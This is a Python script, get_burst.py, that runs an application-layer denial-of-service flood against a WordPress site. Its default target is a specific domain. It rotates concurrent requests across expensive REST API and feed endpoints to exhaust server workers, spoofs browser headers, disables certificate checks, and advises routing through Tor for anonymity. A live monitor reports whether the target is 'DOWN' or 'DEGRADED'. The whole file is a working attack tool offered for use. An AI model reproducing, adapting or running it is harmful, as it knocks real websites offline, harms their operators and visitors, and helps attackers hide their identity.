#!/usr/bin/env python3
"""
get_burst.py — WordPress REST API GET flood / worker exhaustion.
Rotates across 6 expensive REST endpoints (posts, media, comments).
No proxy logic — use torify / ipchanger at system level.
"""

import requests, threading, itertools, time, urllib3, argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

G="\033[0;32m"; R="\033[0;31m"; Y="\033[0;33m"; C="\033[0;36m"; W="\033[0m"; B="\033[1m"

ap = argparse.ArgumentParser()
ap.add_argument("--target",      default="metoo-buffalo.com")
ap.add_argument("--concurrency", type=int, default=30)
ap.add_argument("--timeout",     type=int, default=20)
ap.add_argument("--bursts",      type=int, default=0, help="0 = infinite")
args = ap.parse_args()

domain = args.target.replace("https://","").replace("http://","").strip("/")
BASE   = f"https://{domain}"

ENDPOINTS = [
    BASE + "/wp-json/wp/v2/posts?per_page=100",
    BASE + "/wp-json/wp/v2/media?per_page=100",
    BASE + "/wp-json/wp/v2/comments?per_page=100",
    BASE + "/wp-json/wp/v2/posts?per_page=100&page=2",
    BASE + "/wp-json/wp/v2/posts?per_page=100&_embed=1",
    BASE + "/wp-json/wp/v2/media?per_page=100&page=2",
    BASE + "/feed/?paged=1",
    BASE + "/feed/?paged=2",
    BASE + "/feed/?paged=3",
]

HEADERS = {
    "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":            "application/json, text/plain, */*",
    "Accept-Language":   "en-US,en;q=0.9",
    "sec-fetch-dest":    "empty",
    "sec-fetch-mode":    "cors",
    "Referer":           BASE + "/",
}

ep_lock  = threading.Lock()
ep_cycle = itertools.cycle(ENDPOINTS)

def next_endpoint():
    with ep_lock: return next(ep_cycle)

def fire(_):
    url = next_endpoint()
    t0  = time.time()
    try:
        r = requests.get(url, headers=HEADERS, timeout=args.timeout, verify=False)
        return r.status_code, time.time() - t0
    except Exception:
        return 0, time.time() - t0

# homepage monitor
mon = {"ms": 0, "code": 0, "tag": "...", "color": W}
mon_lock = threading.Lock()

def monitor_loop():
    while True:
        t0m = time.time()
        try:
            r = requests.get(BASE + "/", timeout=12, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"})
            ms, code = (time.time()-t0m)*1000, r.status_code
            color, tag = (R,"DOWN") if code==503 else (G,"FAST") if ms<800 else (Y,"SLOW") if ms<2000 else (R,"DEGRADED")
        except:
            ms, code, color, tag = (time.time()-t0m)*1000, 0, R, "TIMEOUT"
        with mon_lock:
            mon.update(ms=ms, code=code, tag=tag, color=color)
        time.sleep(4)

threading.Thread(target=monitor_loop, daemon=True).start()
time.sleep(1)

print(f"\n{B}{'='*68}{W}")
print(f"  get_burst — WordPress REST API GET Flood")
print(f"{'='*68}")
print(f"  Target      : {BASE}")
print(f"  Endpoints   : {len(ENDPOINTS)} rotating (posts/media/comments/feed)")
print(f"  Concurrency : {args.concurrency}")
print(f"  Mode        : Continuous until Ctrl+C")
print(f"{B}{'='*68}{W}\n")
print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'403':>4} {'429':>4} {'503':>4} {'ERR':>4} {'AVG':>7}  STATUS")
print(f"  {'─'*66}")

burst=0; total=0; t0=time.time()
try:
    while True:
        if args.bursts and burst >= args.bursts: break
        burst += 1
        ts = datetime.now().strftime("%H:%M:%S")
        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            futs  = [ex.submit(fire, i) for i in range(args.concurrency)]
            codes, times = [], []
            for f in as_completed(futs):
                c, t = f.result(); codes.append(c); times.append(t); total += 1

        c200=codes.count(200); c403=codes.count(403)
        c429=codes.count(429); c503=codes.count(503); cerr=codes.count(0)
        avg = sum(times)/len(times)

        if c503 > 0:      st = f"{R}{B}DOWN{W}"
        elif avg > 8:     st = f"{R}HEAVY DEGRADED{W}"
        elif avg > 4:     st = f"{Y}DEGRADED{W}"
        elif c200 > 0:    st = f"{G}HITTING PHP-FPM{W}"
        else:             st = f"{Y}BLOCKED AT EDGE{W}"

        with mon_lock:
            mon_str = f"{mon['color']}{mon['ms']:.0f}ms {mon['tag']} HTTP {mon['code']}{W}"

        print(f"  {C}[{burst:>4}]{W} {ts}  {c200:>4} {c403:>4} {c429:>4} "
              f"{R if c503 else W}{c503:>4}{W} {cerr:>4} {avg:>6.2f}s  {st}  │ {mon_str}")


except KeyboardInterrupt:
    pass

elapsed = time.time() - t0
print(f"\n{B}{'='*68}{W}")
print(f"  Bursts:{burst}  Reqs:{total}  Runtime:{elapsed:.0f}s")
print(f"{B}{'='*68}{W}\n")
